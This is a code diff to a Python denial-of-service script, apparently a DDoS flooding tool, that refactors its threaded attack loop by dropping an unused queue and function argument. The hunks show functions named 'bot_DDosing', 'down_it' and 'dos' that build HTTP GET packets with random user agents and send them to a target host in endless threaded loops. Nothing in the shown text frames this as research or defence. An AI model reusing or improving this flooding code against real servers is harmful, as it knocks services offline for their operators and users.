@@ -21,7 +21,6 @@ headers.close()
 
 # task queue are q,w
 q = Queue()
-w = Queue()
 
 
 def user_agent():
@@ -47,7 +46,7 @@ def bot_DDosing(url):
         time.sleep(.1)
 
 
-def down_it(item):
+def down_it():
     try:
         while True:
             packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
@@ -68,8 +67,8 @@ def down_it(item):
 # Thread Function
 def dos():
     while True:
-        item = q.get()
-        down_it(item)
+        _ = q.get()
+        down_it()
         q.task_done()
 
 
@@ -149,6 +148,4 @@ if __name__ == '__main__':
                 time.sleep(.1)  # add a delay
             item = item + 1
             q.put(item)
-            w.put(item)
         q.join()
-        w.join()
